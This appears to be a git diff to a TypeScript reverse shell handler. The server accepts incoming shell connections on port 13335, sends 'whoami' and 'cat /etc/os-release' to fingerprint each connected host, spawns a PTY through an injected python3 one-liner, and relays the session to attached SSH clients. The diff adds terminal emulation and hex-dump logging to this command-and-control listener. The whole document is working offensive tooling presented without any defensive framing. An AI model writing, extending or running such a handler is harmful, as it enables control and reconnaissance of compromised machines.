@@ -4,6 +4,8 @@ import * as net from 'net';
 import fs from 'fs';
 import path from 'path';
 import { activeConnections, activeSSHConnections, ConnectionInfo } from './state';
+import { Terminal } from '@xterm/headless';
+import { SerializeAddon } from '@xterm/addon-serialize';
 
 const PORT = 13335;
 
@@ -13,13 +15,15 @@ const script = fs.readFileSync(path.join(__dirname, 'client.py'), 'utf-8');
 reverseShellServer.on('connection', (socket) => {
     const connectionId = `${socket.remoteAddress}:${socket.remotePort}`;
     console.log(`[+] New reverse shell connection from ${connectionId}`);
-    const info: ConnectionInfo = { socket, user: '', os: '' };
+    const info: ConnectionInfo = { socket, user: '', os: '', terminal: new Terminal({ rows: 24, cols: 80, allowProposedApi: true }), serializeAddon: new SerializeAddon() };
+    info.terminal.loadAddon(info.serializeAddon);
     activeConnections.set(connectionId, info);
 
     // 发送创建PTY的命令，设置初始终端大小
     const ptyCommand = `python3 -c "${script.replace(/\\/g, '\\').replace(/"/g, '\\"')}" ; echo SHELL_EXITED`;
     info.socket.write('echo ---START_INFO$[1+1]---\necho WHOAMI=$(whoami)\ncat /etc/os-release\necho ---END_INFO$[1+1]---\n');
     info.socket.write(ptyCommand);
+    info.socket.write('\nclear\n');
 
     let isInfo = false;
     let buffer = '';
@@ -58,7 +62,9 @@ reverseShellServer.on('connection', (socket) => {
             info.socket.write(ptyCommand);
             return;
         }
-        console.log(`[${connectionId}] ${str.trim()}`);
+        info.terminal.write(data);
+        // write hex dump
+        console.log(`[${connectionId}] ${data.toString('hex')}`);
         activeSSHConnections.forEach((sshConn) => {
             if (sshConn.selectedId === connectionId && sshConn.stream) {
                 sshConn.stream.write(data);
